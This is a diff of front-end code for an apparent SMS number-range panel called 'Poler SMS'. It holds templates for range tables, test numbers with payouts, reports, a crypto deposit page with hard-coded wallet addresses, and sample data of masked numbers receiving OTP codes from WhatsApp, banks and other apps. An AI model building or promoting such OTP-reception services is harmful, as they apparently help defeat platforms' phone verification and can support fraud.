+                    <div class="table-actions">
+                        <div class="range-selector">
+                            <select id="sms-number-records-per-page"><option>10</option><option>25</option><option>50</option><option>100</option></select>
+                            <!-- REPLACED "Print" button with search input for this section -->
+                            <div class="input-with-icon" style="min-width: 150px;">
+                                <input type="text" placeholder="Search Records..." id="sms-number-top-search-input">
+                                <i class="fas fa-search"></i>
+                            </div>
+                        </div>
+                        <div class="data-actions">
+                            <span id="sms-number-record-info">Show Records: 0</span>
+                            <button id="sms-number-copy-btn">Copy</button>
+                            <button id="sms-number-csv-btn">CSV</button>
+                            <button id="sms-number-excel-btn">Excel</button>
+                            <button id="sms-number-pdf-btn">PDF</button>
+                            <button id="sms-number-print-btn">Print</button>
+                            <!-- Existing search input that also needs an icon -->
+                            <div class="input-with-icon" style="min-width: 150px;">
+                                <input type="text" placeholder="Search Table..." id="sms-number-table-search-input">
+                                <i class="fas fa-search"></i>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="table-wrapper">
+                        <table class="sms-table" id="sms-number-table">
+                            <thead><tr><th>BANDE</th><th>PREFIX</th><th>NUMBER</th><th>MY PATTERN</th><th>MY KNOWT</th><th>LIMITS</th></tr></thead>
+                            <tbody id="sms-number-tbody"></tbody>
+                        </table>
+                    </div>
+                    <div class="pagination">
+                        <div class="pagination-info" id="sms-number-pagination-info">Showing 0 to 0 of 0 entries</div>
+                        <div class="pagination-controls" id="sms-number-pagination-controls"></div>
+                    </div>
+                </div>`,
+            smsRange: `
+                <div class="header"><h1>SMS Range</h1><button class="back-to-dashboard"><i class="fas fa-arrow-left"></i> Back</button></div>
+                <p>Our All Ranges will show here.. you can search your desired range and request numbers.</p>
+                <div class="table-container"><h3 class="sms-cdr-title">ALL SMS RANGES/TERMINATIONS</h3><div class="table-actions"><div class="data-actions"><div class="input-with-icon" style="min-width: 250px;"><input type="text" id="sms-range-search-input" placeholder="Search..."><i class="fas fa-search"></i></div></div><div class="data-actions"><button>Copy</button><button>CSV</button><button>Excel</button><button>PDF</button><button>Print</button></div><div class="range-selector"><span>Show Records:</span><select id="sms-range-records-per-page"><option>25</option><option>50</option><option>100</option></select></div></div><div class="table-wrapper"><table class="sms-table" id="sms-range-table"><thead><tr><th>Range</th><th>Prefix</th><th>Test Number</th><th>Currency</th></tr></thead><tbody id="sms-range-tbody"></tbody></table></div><div class="pagination"><div class="pagination-info" id="sms-range-pagination-info"></div><div class="pagination-controls" id="sms-range-pagination-controls"></div></div></div>`,
+            smsReports: `
+                <div class="header"><h1>SMS Reports</h1><button class="back-to-dashboard"><i class="fas fa-arrow-left"></i> Back</button></div>
+                <p>Here You can view all the sms stats.</p>
+                <div class="report-filters">
+                    <div class="filter-row">
+                        <input type="date" id="report-start-date" value="2025-08-14">
+                        <input type="date" id="report-end-date" value="2025-08-14">
+                        <select id="report-filter-range"><option value="">Filter Range</option><option value="range1">Range 1</option><option value="range2">Range 2</option></select>
+                        <input type="text" id="report-search-number" placeholder="Search Number">
+                        <input type="text" id="report-search-cli" placeholder="Search CLI">
+                    </div>
+                    <div class="filter-row">
+                        <div class="group-by-options">
+                            <span class="group-by-label">Group By:</span>
+                            <label><input type="checkbox" id="group-by-date"> Date</label>
+                            <label><input type="checkbox" id="group-by-month"> Month</label>
+                            <label><input type="checkbox" id="group-by-range"> Range</label>
+                            <label><input type="checkbox" id="group-by-number"> Number</label>
+                            <label><input type="checkbox" id="group-by-cli"> CLI</label>
+                        </div>
+                        <div class="report-actions">
+                            <button class="btn-export" id="btn-export-report">Export Report</button>
+                            <button class="btn-show" id="btn-show-report">Show Report</button>
+                        </div>
+                    </div>
+                </div>
+                <div class="table-container">
+                    <h3 class="sms-cdr-title">SMS CDR REPORTS & STATS</h3>
+                    <div class="table-actions">
+                        <div class="data-actions">
+                            <div class="input-with-icon" style="min-width: 200px;">
+                                <input type="text" placeholder="Search..." id="sms-reports-table-search-input">
+                                <i class="fas fa-search"></i>
+                            </div>
+                        </div>
+                        <div class="data-actions">
+                            <button id="sms-reports-copy-btn">Copy</button>
+                            <button id="sms-reports-csv-btn">CSV</button>
+                            <button id="sms-reports-excel-btn">Excel</button>
+                            <button id="sms-reports-pdf-btn">PDF</button>
+                            <button id="sms-reports-print-btn">Print</button>
+                        </div>
+                        <div class="range-selector">
+                            <span>Show Records:</span>
+                            <select id="sms-reports-records-per-page"><option>25</option><option>50</option><option>100</option></select>
+                        </div>
+                    </div>
+                    <div class="table-wrapper">
+                        <table class="sms-table" id="sms-reports-table">
+                            <thead><tr><th>Date</th><th>Range</th><th>Number</th><th>CLI</th><th>SMS</th></tr></thead>
+                            <tbody id="sms-reports-tbody"></tbody>
+                        </table>
+                    </div>
+                    <div class="pagination">
+                        <div class="pagination-info" id="sms-reports-pagination-info">Showing 0 to 0 of 0 entries</div>
+                        <div class="pagination-controls" id="sms-reports-pagination-controls"></div>
+                    </div>
+                </div>`,
+            deposit: `
+                <div class="header"><h1>Deposit</h1><button class="back-to-dashboard"><i class="fas fa-arrow-left"></i> Back</button></div>
+                <div class="deposit-box">
+                    <img src="https://i.ibb.co/yWXFv9F/binance-pay-logo.png" alt="Binance Logo" id="network-logo" class="deposit-logo">
+                    <label for="network-select">Choose Network</label>
+                    <div class="select-wrapper">
+                        <select id="network-select">
+                            <option value="trc20">Tron (TRC20) <i class="fab fa-tron"></i></option>
+                            <option value="bep20">BNB (BEP20) <i class="fab fa-ethereum"></i></option>
+                            <option value="erc20">Ethereum (ERC20) <i class="fab fa-ethereum"></i></option>
+                            <option value="ton">TON <i class="fas fa-paper-plane"></i></option> <!-- Using paper-plane for TON -->
+                            <option value="polygon">Polygon POS <i class="fas fa-cubes"></i></option> <!-- Using cubes for Polygon -->
+                            <option value="solana">Solana <i class="fas fa-sun"></i></option> <!-- Using sun for Solana -->
+                        </select>
+                    </div>
+
+                    <div id="trc20-details" class="network-details">
+                        <p><strong>Tron (TRC20) Address:</strong></p>
+                        <div class="address-box">
+                            <span id="trc20-address">TNYc7aKa4ouHBQCRRgQihoRKP4vTcEwBYP</span>
+                            <button class="copy-btn" data-copy-target="trc20-address" title="Copy Address"><i class="fas fa-copy"></i></button>
+                        </div>
+                    </div>
+
+                    <div id="bep20-details" class="network-details" style="display: none;">
+                        <p><strong>BNB (BEP20) Address:</strong></p>
+                        <div class="address-box">
+                            <span id="bep20-address">0xf764bb815ed75339df04107a148c4ca4bf3e5a72</span>
+                            <button class="copy-btn" data-copy-target="bep20-address" title="Copy Address"><i class="fas fa-copy"></i></button>
+                        </div>
+                    </div>
+
+                    <div id="erc20-details" class="network-details" style="display: none;">
+                        <p><strong>Ethereum (ERC20) Address:</strong></p>
+                        <div class="address-box">
+                            <span id="erc20-address">0xf764bb815ed75339df04107a148c4ca4bf3e5a72</span>
+                            <button class="copy-btn" data-copy-target="erc20-address" title="Copy Address"><i class="fas fa-copy"></i></button>
+                        </div>
+                        <p class="info-small">Network fees may apply.</p>
+                    </div>
+
+                    <div id="ton-details" class="network-details" style="display: none;">
+                        <p><strong>TON Address:</strong></p>
+                        <div class="address-box">
+                            <span id="ton-address">EQD5mxRgCuRNLxKxeOjG6r14iSroLF5FtomPnet-sgP5xNJb</span>
+                            <button class="copy-btn" data-copy-target="ton-address" title="Copy Address"><i class="fas fa-copy"></i></button>
+                        </div>
+                        <p><strong>USDTMEMO:</strong></p>
+                        <div class="address-box">
+                            <span id="ton-memo">107129374</span>
+                            <button class="copy-btn" data-copy-target="ton-memo" title="Copy Memo"><i class="fas fa-copy"></i></button>
+                        </div>
+                    </div>
+
+                    <div id="polygon-details" class="network-details" style="display: none;">
+                        <p><strong>Polygon POS Address:</strong></p>
+                        <div class="address-box">
+                            <span id="polygon-address">0xf764bb815ed75339df04107a148c4ca4bf3e5a72</span>
+                            <button class="copy-btn" data-copy-target="polygon-address" title="Copy Address"><i class="fas fa-copy"></i></button>
+                        </div>
+                    </div>
+
+                    <div id="solana-details" class="network-details" style="display: none;">
+                        <p><strong>Solana Address:</strong></p>
+                        <div class="address-box">
+                            <span id="solana-address">44LYp6Kwdbk1ckU5UyRJ3VoEtFRVb32E6zZsjhkQxWxW</span>
+                            <button class="copy-btn" data-copy-target="solana-address" title="Copy Address"><i class="fas fa-copy"></i></button>
+                        </div>
+                    </div>
+
+                    <div class="amount-section">
+                        <div class="info-box"><i class="fas fa-info-circle"></i><span>Minimum amount 50$</span></div>
+                        <label for="deposit-amount">Amount</label>
+                        <input type="number" id="deposit-amount" placeholder="Enter amount (e.g., 50)" min="50">
+                        <label for="transaction-id">Transaction ID</label>
+                        <input type="text" id="transaction-id" placeholder="Enter your transaction ID/Hash">
+                        <button id="deposit-button">Deposit</button>
+                    </div>
+                    <p id="deposit-message" class="deposit-message"></p>
+                </div>
+                <div class="history-container"><h2>Deposit History</h2><div class="table-wrapper"><table class="sms-table"><thead><tr><th>Date & Time</th><th>Amount (USD)</th><th>Network</th><th>Transaction ID</th><th>Status</th></tr></thead><tbody id="deposit-history-body"></tbody></table></div></div>`,
+            smsTest: `
+                <div class="header"><h1>SMS Test Panel</h1><button class="back-to-dashboard"><i class="fas fa-arrow-left"></i> Back</button></div>
+                <div class="sms-test-wrapper">
+                    <div class="test-panel">
+                        <h2>SMS TEST NUMBERS</h2>
+                        <div class="test-panel-controls">
+                            <div class="input-with-icon search-input-wrapper">
+                                <input type="text" placeholder="Search..." class="search-input" id="sms-test-numbers-search-input">
+                                <i class="fas fa-search"></i>
+                            </div>
+                            <select id="sms-test-numbers-records-per-page"><option>25</option><option>50</option><option>100</option></select>
+                        </div>
+                        <div class="test-panel-buttons" style="margin-bottom: 15px;">
+                            <button id="btn-copy-1">Copy</button>
+                            <button id="btn-csv-1">CSV</button>
+                            <button id="btn-excel-1">Excel</button>
+                            <button id="btn-pdf-1">PDF</button>
+                            <button id="btn-print-1">Print</button>
+                        </div>
+                        <div class="table-wrapper" style="max-height: 400px; overflow-y: auto;">
+                            <table class="sms-table" id="sms-test-numbers-table">
+                                <thead><tr><th>Range</th><th>Prefix</th><th>Test Number</th><th>Payout</th><th>Limits</th></tr></thead>
+                                <tbody id="sms-test-numbers-tbody"></tbody>
+                            </table>
+                        </div>
+                        <div class="pagination">
+                            <div class="pagination-info" id="sms-test-numbers-pagination-info"></div>
+                            <div class="pagination-controls" id="sms-test-numbers-pagination-controls"></div>
+                        </div>
+                    </div>
+                    <div class="test-panel">
+                        <h2>RECENT SMS TEST</h2>
+                        <div class="test-panel-controls">
+                            <div class="input-with-icon search-input-wrapper">
+                                <input type="text" placeholder="Search..." class="search-input" id="recent-sms-test-search-input">
+                                <i class="fas fa-search"></i>
+                            </div>
+                            <select id="recent-sms-test-records-per-page"><option>25</option><option>50</option><option>100</option></select>
+                        </div>
+                        <div class="test-panel-buttons" style="margin-bottom: 15px;">
+                            <button id="btn-copy-2">Copy</button>
+                            <button id="btn-csv-2">CSV</button>
+                            <button id="btn-excel-2">Excel</button>
+                            <button id="btn-pdf-2">PDF</button>
+                            <button id="btn-print-2">Print</button>
+                        </div>
+                        <div class="table-wrapper" style="max-height: 400px; overflow-y: auto;">
+                            <table class="sms-table" id="recent-sms-test-table">
+                                <thead><tr><th>Date</th><th>Range</th><th>Number</th><th>CLI</th><th>SMS</th></tr></thead>
+                                <tbody id="recent-sms-test-tbody"></tbody>
+                            </table>
+                        </div>
+                        <div class="pagination">
+                            <div class="pagination-info" id="recent-sms-test-pagination-info"></div>
+                            <div class="pagination-controls" id="recent-sms-test-pagination-controls"></div>
+                        </div>
+                    </div>
+                </div>`,
+            aiRobotSms: ` <!-- Now Live Support Template -->
+                <div class="header"><h1>Live Support</h1><button class="back-to-dashboard"><i class="fas fa-arrow-left"></i> Back</button></div>
+                <div class="ai-robot-sms-grid">
+                    <!-- Poler SMS Bot Feature Box -->
+                    <div class="ai-feature-box">
+                        <h3>Poler SMS Bot <span class="active-dot"></span></h3>
+                        <div id="poler-sms-bot-content">
+                            <!-- Initial bot message and options -->
+                            <div id="bot-initial-prompt">
+                                <p style="margin-bottom: 15px; color: var(--text-color); font-size: 14px;">Welcome back to Poler SMS Bot! How can I help you today? Please select an option:</p>
+                                <div class="bot-options" id="bot-options-initial" style="display: flex; flex-direction: column; gap: 10px;">
+                                    <button class="bot-action-btn" data-action="add-range">Add Range</button>
+                                    <button class="bot-action-btn" data-action="back-dashboard">Back to Dashboard</button>
+                                </div>
+                            </div>
+
+                            <!-- Add Range Form (initially hidden) -->
+                            <div id="add-range-form-section" style="display: none;">
+                                <p style="margin-bottom: 15px; color: var(--text-color); font-size: 14px;">Please fill out the form to add a range:</p>
+                                <label for="termination-name" style="text-align: left; display: block; margin-bottom: 5px; font-size: 14px; font-weight: 500;">Termination Name</label>
+                                <input type="text" id="termination-name" placeholder="Enter termination name" required>
+
+                                <label for="terms-select" style="text-align: left; display: block; margin-bottom: 5px; font-size: 14px; font-weight: 500;">Terms</label>
+                                <select id="terms-select" style="width: 100%; padding: 12px 15px; margin-bottom: 15px; border: 1px solid var(--border-color); border-radius: 8px; font-size: 15px; background: var(--input-bg); color: var(--text-color);">
+                                    <!-- Options populated by JS -->
+                                </select>
+                                <button id="submit-add-range" style="width: 100%; padding: 12px; background: linear-gradient(to right, var(--primary), var(--secondary)); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);">Add</button>
+                                <div id="add-range-response-message" class="ai-response-message" style="margin-top: 15px;"></div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Ask AI about Poler SMS Feature Box -->
+                    <div class="ai-feature-box">
+                        <h3>Ask AI about Poler SMS <span class="active-dot"></span></h3>
+                        <p style="margin-bottom: 15px; color: var(--text-color); font-size: 14px;">Ask me anything about Poler SMS services or general queries, like a Google Assistant.</p>
+                        <input type="text" id="ai-question-input" placeholder="Ask your question (e.g., What is Poler SMS?)">
+                        <button id="ai-ask-btn"><i class="fas fa-robot"></i> Ask AI</button>
+                        <div id="ai-response-area" class="ai-response-message"></div>
+                    </div>
+
+                    <!-- Live Support Chat (human agents) -->
+                    <div class="ai-feature-box">
+                        <h3>Live Support Chat <span class="active-dot"></span></h3>
+                        <p style="margin-bottom: 15px; color: var(--text-color); font-size: 14px;">Chat directly with our support team.</p>
+                        <div class="live-chat-window">
+                            <div class="chat-header">
+                                <img src="https://i.ibb.co/hLd7VdD/girl-avatar.png" alt="Agent Avatar" class="agent-avatar" id="agent-avatar">
+                                <div class="agent-info">
+                                    <span id="current-agent-name">Agent Name</span>
+                                    <span class="active-dot"></span>
+                                </div>
+                            </div>
+                            <div class="chat-messages" id="live-chat-messages">
+                                <div class="chat-message support"><span class="sender-name">Support:</span> Hi there! How can I help you today?</div>
+                            </div>
+                            <div class="chat-input-area">
+                                <div class="suggested-messages" id="suggested-messages">
+                                    <button data-suggestion="How do I make a deposit?">How to deposit?</button>
+                                    <button data-suggestion="What is my current balance?">Current balance?</button>
+                                    <button data-suggestion="I have a problem with my SMS.">SMS issue</button>
+                                    <button data-suggestion="Can I get a report?">Get report</button>
+                                </div>
+                                <div class="chat-input-controls">
+                                    <input type="text" id="live-chat-input" placeholder="Type your message...">
+                                    <div class="file-input-wrapper">
+                                        <label for="live-chat-screenshot-input">
+                                            <i class="fas fa-image"></i> <!-- Gallery icon -->
+                                        </label>
+                                        <input type="file" id="live-chat-screenshot-input" accept="image/*">
+                                        <label for="live-chat-file-input">
+                                            <i class="fas fa-paperclip"></i> <!-- File icon -->
+                                        </label>
+                                        <input type="file" id="live-chat-file-input">
+                                    </div>
+                                    <button id="live-chat-send-btn" class="send-button"><i class="fas fa-paper-plane"></i> Send</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            `
+        };
+        
+        // --- DYNAMIC DATA AND HELPERS ---
+        const generateRandomNumber = (length) => {
+            if (length <= 0) return '';
+            const min = Math.pow(10, length - 1);
+            const max = Math.pow(10, length) - 1;
+            return Math.floor(min + Math.random() * (max - min + 1));
+        };
+        // This maskService function is used for CLI display in reports and test panel
+        const maskService = (service) => {
+            if (!service) return 'N/A';
+            // Extract the first 3 characters, then append XXX
+            return service.substring(0, Math.min(3, service.length)) + 'XXX'; 
+        }; 
+
+        // --- Dashboard SMS Data (UPDATED with 50+ app names) ---
+        const smsData = [
+            // Original entries (a few for variety)
+            { country: "Madagascar", flag: "🇲🇬", serviceID: "2203", app: "Raya", number: "2613924XXXXX", content: "Your Raya verification code is: _CODE_.", otpLength: 5 },
+            { country: "Ivory Coast", flag: "🇨🇮", serviceID: "9227", app: "Apple", number: "2250141XXXXX", content: "REG-RESP?v=X;r=XXXXXXXX;n=XXXXXXXXXXXXXXX;s=XXXXXXXXXXXXXXX", otpLength: 0 },
+            { country: "Guinea", flag: "🇬🇳", serviceID: "619", app: "WorldRemit", number: "2246288XXXXX", content: "Vous pouvez retirer XXXX.XX GNF de Fadi dans Afro International. Apportez ID et i", otpLength: 4 },
+            { country: "Slovenia", flag: "🇸🇮", serviceID: "343", app: "Shop", number: "3867023XXXXX", content: "XXXXXX ist dein Shop Code", otpLength: 6 },
+            { country: "Peru", flag: "🇵🇪", serviceID: "8821", app: "Uber", number: "5193191XXXXX", content: "Your Uber code is XXXXX. Never share this code.", otpLength: 4 },
+            { country: "Brazil", flag: "🇧🇷", serviceID: "WHATSAPP", app: "WhatsApp", number: "+55119XXXXX", content: "Seu código de verificação do WhatsApp é _CODE_.", otpLength: 6 },
+            { country: "Mexico", flag: "🇲🇽", serviceID: "GOOGLE", app: "Google", number: "+5255123XXXXX", content: "Tu código de verificación de Google es: _CODE_.", otpLength: 6 },
+            { country: "Nigeria", flag: "🇳🇬", serviceID: "OPAY", app: "OPay", number: "+234801XXXXX", content: "Your OPay OTP is _CODE_.", otpLength: 6 },
+            { country: "South Africa", flag: "🇿🇦", serviceID: "FNB", app: "FNB", number: "+2782XXXXX", content: "FNB OTP: _CODE_ for your transaction.", otpLength: 6 },
+            { country: "Kenya", flag: "🇰🇪", serviceID: "MPESA", app: "M-PESA", number: "+2547XXXXX", content: "Your M-PESA transaction code is _CODE_.", otpLength: 5 },
+            { country: "Argentina", flag: "🇦🇷", serviceID: "MERCADO", app: "Mercado Pago", number: "+54911XXXXX", content: "Tu código de Mercado Pago es: _CODE_.", otpLength: 6 },
+            { country: "Colombia", flag: "🇨🇴", serviceID: "NEQUI", app: "Nequi", number: "+57300XXXXX", content: "Tu código Nequi: _CODE_.", otpLength: 6 },
+
+            // Expanded list to reach 50+ unique apps/services
+            { country: "India", flag: "🇮🇳", serviceID: "TELEGRAM", app: "Telegram", number: "+9187654XXXXX", content: "Telegram code: _CODE_.", otpLength: 5 },
+            { country: "India", flag: "🇮🇳", serviceID: "FACEBOOK", app: "Facebook", number: "+9176543XXXXX", content: "Your Facebook login code is _CODE_.", otpLength: 6 },
+            { country: "India", flag: "🇮🇳", serviceID: "MICROSOFT", app: "Microsoft", number: "+9199887XXXXX", content: "Your Microsoft code is _CODE_.", otpLength: 7 },
+            { country: "India", flag: "🇮🇳", serviceID: "IMO", app: "IMO", number: "+9191234XXXXX", content: "IMO verification code: _CODE_.", otpLength: 4 },
+            { country: "India", flag: "🇮🇳", serviceID: "AMAZON", app: "Amazon", number: "+9180123XXXXX", content: "Your Amazon OTP is _CODE_.", otpLength: 6 },
+            { country: "Egypt", flag: "🇪🇬", serviceID: "TELEGRAM", app: "Telegram", number: "+20101XXXXX", content: "رمز تسجيل الدخول الخاص بك في تيليجرام هو: _CODE_.", otpLength: 5 },
+            { country: "Indonesia", flag: "🇮🇩", serviceID: "GRAB", app: "Grab", number: "+62812XXXXX", content: "Kode verifikasi Grab Anda: _CODE_.", otpLength: 4 },
+            { country: "Philippines", flag: "🇵🇭", serviceID: "SHOPEE", app: "Shopee", number: "63917XXXXX", content: "Your Shopee OTP is _CODE_.", otpLength: 6 },
+            { country: "Bangladesh", flag: "🇧🇩", serviceID: "BKASH", app: "Bkash", number: "+88017XXXXX", content: "Bkash verification code: _CODE_.", otpLength: 5 },
+            { country: "Pakistan", flag: "🇵🇰", serviceID: "JAZZ", app: "JazzCash", number: "+92300XXXXX", content: "Your JazzCash OTP is _CODE_.", otpLength: 4 },
+            { country: "Russia", flag: "🇷🇺", serviceID: "VK", app: "VKontakte", number: "+7903XXXXX", content: "Ваш код для ВКонтакте: _CODE_.", otpLength: 6 },
+            { country: "Germany", flag: "🇩🇪", serviceID: "PAYPAL", app: "PayPal", number: "+49176XXXXX", content: "Ihr PayPal Sicherheitscode lautet: _CODE_.", otpLength: 6 },
+            { country: "France", flag: "🇫🇷", serviceID: "ORANGE", app: "Orange Money", number: "+336XXXXX", content: "Votre code Orange Money: _CODE_.", otpLength: 4 },
+            { country: "Spain", flag: "🇪🇸", serviceID: "WHATSAPP", app: "WhatsApp", number: "+346XXXXX", content: "Tu código de WhatsApp es _CODE_.", otpLength: 6 },
+            { country: "UK", flag: "🇬🇧", serviceID: "AMAZONUK", app: "Amazon UK", number: "+447XXXXX", content: "Your Amazon UK OTP is _CODE_.", otpLength: 6 },
+            { country: "Canada", flag: "🇨🇦", serviceID: "MICROSF", app: "Microsoft", number: "+1416XXXXX", content: "Microsoft verification code: _CODE_.", otpLength: 7 },
+            { country: "Australia", flag: "🇦🇺", serviceID: "UBERA", app: "Uber", number: "+614XXXXX", content: "Your Uber code is: _CODE_.", otpLength: 4 },
+            { country: "Turkey", flag: "🇹🇷", serviceID: "PAPARA", app: "Papara", number: "+90532XXXXX", content: "Papara doğrulama kodunuz: _CODE_.", otpLength: 6 },
+            { country: "Vietnam", flag: "🇻🇳", serviceID: "ZALO", app: "Zalo", number: "+849XXXXX", content: "Mã xác thực Zalo của bạn là: _CODE_.", otpLength: 4 },
+            { country: "Thailand", flag: "🇹🇭", serviceID: "LINEAPP", app: "LINE", number: "+668XXXXX", content: "รหัสยืนยัน LINE ของคุณคือ: _CODE_.", otpLength: 6 },
+            { country: "Malaysia", flag: "🇲🇾", serviceID: "GRABM", app: "Grab", number: "+6012XXXXX", content: "Your Grab verification code is _CODE_.", otpLength: 4 },
+            { country: "Chile", flag: "🇨🇱", serviceID: "BANCOE", app: "BancoEstado", number: "+569XXXXX", content: "Clave dinámica BancoEstado: _CODE_.", otpLength: 7 },
+            { country: "Saudi Arabia", flag: "🇸🇦", serviceID: "STCPAY", app: "STC Pay", number: "+96650XXXXX", content: "رمز تحقق STC Pay الخاص بك هو: _CODE_.", otpLength: 4 },
+            { country: "UAE", flag: "🇦🇪", serviceID: "DU", app: "Du", number: "+9715XXXXX", content: "Your Du OTP is _CODE_.", otpLength: 6 },
+            { country: "Qatar", flag: "🇶🇦", serviceID: "OOREDOO", app: "Ooredoo", number: "+974XXXXX", content: "Ooredoo verification code: _CODE_.", otpLength: 5 },
+            { country: "Kuwait", flag: "🇰🇼", serviceID: "ZAIN", app: "Zain", number: "+965XXXXX", content: "Zain OTP: _CODE_ for your service.", otpLength: 6 },
+            { country: "Oman", flag: "🇴🇲", serviceID: "OMANTELL", app: "Omantel", number: "+968XXXXX", content: "Your Omantel verification code is _CODE_.", otpLength: 4 },
+
+            // Adding more diverse app names
+            { country: "USA", flag: "🇺🇸", serviceID: "NETFLIX", app: "Netflix", number: "+1201XXXXX", content: "Your Netflix verification code is _CODE_.", otpLength: 6 },
+            { country: "USA", flag: "🇺🇸", serviceID: "DISCORD", app: "Discord", number: "+1202XXXXX", content: "Your Discord verification code is: _CODE_.", otpLength: 6 },
+            { country: "USA", flag: "🇺🇸", serviceID: "SNAPCHAT", app: "Snapchat", number: "+1203XXXXX", content: "Your Snapchat code is _CODE_.", otpLength: 6 },
+            { country: "USA", flag: "🇺🇸", serviceID: "INSTAG", app: "Instagram", number: "+1204XXXXX", content: "Your Instagram code is _CODE_.", otpLength: 6 },
+            { country: "USA", flag: "🇺🇸", serviceID: "TWITTER", app: "Twitter", number: "+1205XXXXX", content: "Your Twitter verification code is _CODE_.", otpLength: 6 },
+            { country: "USA", flag: "🇺🇸", serviceID: "LINKEDIN", app: "LinkedIn", number: "+1206XXXXX", content: "Your LinkedIn verification code: _CODE_.", otpLength: 6 },
+            { country: "USA", flag: "🇺🇸", serviceID: "AIRBNB", app: "Airbnb", number: "+1207XXXXX", content: "Your Airbnb code is _CODE_.", otpLength: 4 },
+            { country: "USA", flag: "🇺🇸", serviceID: "BOOKING", app: "Booking.com", number: "+1208XXXXX", content: "Your Booking.com verification code is _CODE_.", otpLength: 5 },
+            { country: "USA", flag: "🇺🇸", serviceID: "DOORDASH", app: "DoorDash", number: "+1209XXXXX", content: "Your DoorDash code is _CODE_.", otpLength: 6 },
+            { country: "Singapore", flag: "🇸🇬", serviceID: "COINBASE", app: "Coinbase", number: "+659XXXXX", content: "Your Coinbase verification code: _CODE_.", otpLength: 7 },
+            { country: "Singapore", flag: "🇸🇬", serviceID: "BINANCE", app: "Binance", number: "+658XXXXX", content: "Your Binance verification code: _CODE_.", otpLength: 6 },
+            { country: "USA", flag: "🇺🇸", serviceID: "ROBLOX", app: "Roblox", number: "+1210XXXXX", content: "Roblox verification code: _CODE_.", otpLength: 6 },
+            { country: "USA", flag: "🇺🇸", serviceID: "EPIC", app: "Epic Games", number: "+1211XXXXX", content: "Epic Games verification code: _CODE_.", otpLength: 6 },
+            { country: "USA", flag: "🇺🇸", serviceID: "STEAM", app: "Steam", number: "+1212XXXXX", content: "Your Steam Guard code is: _CODE_.", otpLength: 5 },
+            { country: "Sweden", flag: "🇸🇪", serviceID: "SPOTIFY", app: "Spotify", number: "+467XXXXX", content: "Your Spotify code is _CODE_.", otpLength: 6 },
+            { country: "USA", flag: "🇺🇸", serviceID: "ZOOM", app: "Zoom", number: "+1213XXXXX", content: "Your Zoom verification code: _CODE_.", otpLength: 6 },
+            { country: "USA", flag: "🇺🇸", serviceID: "TEAMS", app: "Microsoft Teams", number: "+1214XXXXX", content: "Your Microsoft Teams code is _CODE_.", otpLength: 6 },
+            { country: "China", flag: "🇨🇳", serviceID: "WECHAT", app: "WeChat", number: "+86139XXXXX", content: "Your WeChat verification code: _CODE_.", otpLength: 6 },
+            { country: "South Korea", flag: "🇰🇷", serviceID: "KAKAOTALK", app: "KakaoTalk", number: "+8210XXXXX", content: "KakaoTalk verification code: _CODE_.", otpLength: 4 },
+            { country: "Singapore", flag: "🇸🇬", serviceID: "VIBER", app: "Viber", number: "+6591XXXXX", content: "Your Viber code: _CODE_.", otpLength: 4 },
+            { country: "USA", flag: "🇺🇸", serviceID: "SIGNAL", app: "Signal", number: "+1215XXXXX", content: "Your Signal verification code: _CODE_.", otpLength: 6 },
+            { country: "UK", flag: "🇬🇧", serviceID: "WISE", app: "Wise", number: "+4477XXXXX", content: "Your Wise (TransferWise) code is _CODE_.", otpLength: 6 },
+            { country: "UK", flag: "🇬🇧", serviceID: "REVOLUT", app: "Revolut", number: "+4478XXXXX", content: "Your Revolut verification code: _CODE_.", otpLength: 6 },
+            { country: "Germany", flag: "🇩🇪", serviceID: "N26", app: "N26 Bank", number: "+4915XXXXX", content: "N26 verification code: _CODE_.", otpLength: 6 },
+            { country: "Indonesia", flag: "🇮🇩", serviceID: "DANA", app: "DANA", number: "+6287XXXXX", content: "Kode OTP DANA Anda: _CODE_.", otpLength: 6 },
+            { country: "India", flag: "🇮🇳", serviceID: "FLIPKART", app: "Flipkart", number: "+9190XXXXX", content: "Your Flipkart OTP is _CODE_.", otpLength: 6 },
+            { country: "India", flag: "🇮🇳", serviceID: "MYNTRA", app: "Myntra", number: "+9192XXXXX", content: "Your Myntra OTP is _CODE_.", otpLength: 6 },
+            { country: "India", flag: "🇮🇳", serviceID: "ZOMATO", app: "Zomato", number: "+9193XXXXX", content: "Your Zomato verification code: _CODE_.", otpLength: 6 },
+            { country: "Pakistan", flag: "🇵🇰", serviceID: "CAREEM", app: "Careem", number: "+9233XXXXX", content: "Your Careem verification code: _CODE_.", otpLength: 4 },
+            { country: "USA", flag: "🇺🇸", serviceID: "LYFT", app: "Lyft", number: "+1216XXXXX", content: "Your Lyft code is _CODE_.", otpLength: 4 },
+            { country: "USA", flag: "🇺🇸", serviceID: "BOLT", app: "Bolt", number: "+1217XXXXX", content: "Your Bolt code is _CODE_.", otpLength: 4 },
+            { country: "Egypt", flag: "🇪🇬", serviceID: "VODAF", app: "Vodafone Cash", number: "+2010XXXXX", content: "كود فودافون كاش: _CODE_.", otpLength: 4 }
+        ];
+        
+        // --- Deposit History Data ---
+        const sampleDepositHistory = [
+            { date: "2025-08-14 10:30 AM", amount: "50.00", network: "TRC20", tx: "a1b2...f6e5", status: "Completed", statusClass: "status-completed" },
+            { date: "2025-08-13 03:45 PM", amount: "100.00", network: "BEP20", tx: "x1y2...c6b5", status: "Completed", statusClass: "status-completed" },
+            { date: "2025-08-13 11:00 AM", amount: "25.00", network: "TRC20", status: "Failed", statusClass: "status-failed" }, // Failed, no tx needed
+            { date: "2025-08-12 09:15 AM", amount: "250.00", network: "BEP20", tx: "p4q5...k9j8", status: "Completed", statusClass: "status-completed" },
+            { date: "2025-08-11 08:50 PM", amount: "35.50", network: "TRC20", status: "Pending", statusClass: "status-pending" }, // Pending, no tx needed
+            { date: "2025-08-11 01:20 PM", amount: "75.00", network: "BEP20", tx: "b5c6...z3y2", status: "Completed", statusClass: "status-completed" },
+            { date: "2025-08-10 06:00 AM", amount: "40.00", network: "TRC20", tx: "v6w7...u8t9", status: "Completed", statusClass: "status-completed" },
+            { date: "2025-08-09 11:00 AM", amount: "60.00", network: "ERC20", tx: "e1t2...h7r8", status: "Completed", statusClass: "status-completed" },
+            { date: "2025-08-08 02:10 PM", amount: "120.00", network: "TON", tx: "q7w8...e9t0", status: "Completed", statusClass: "status-completed" },
